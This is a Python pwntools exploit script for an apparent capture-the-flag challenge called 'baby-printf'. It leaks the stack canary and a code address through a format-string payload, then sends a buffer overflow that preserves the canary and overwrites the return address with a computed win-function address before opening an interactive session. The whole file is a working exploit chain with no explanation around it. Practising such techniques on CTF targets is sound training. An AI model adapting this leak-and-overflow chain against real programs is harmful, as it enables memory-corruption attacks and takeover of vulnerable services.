#!/usr/bin/env python3
from pwn import process, remote, p64, args

if args.REMOTE:
    p = remote('baby-printf.challs.olicyber.it', 34004)
else:
    p = process('./babyprintf', env={'FLAG':"flag{lol}"})

PAYLOAD1 = b'%11$p.%15$p' # canary.address of main
p.recvuntil(b'back:\n')
p.sendline(PAYLOAD1)
risp = p.recvuntil(b'\n').split(b'.')
canary = p64(int(risp[0], 16))
main = int(risp[1], 16) - 54 # address of win
PAYLOAD = b'a'*40 + canary + b'a'*8 + p64(main)
p.sendline(PAYLOAD)
p.recv()
p.sendline(b'!q')
p.interactive()
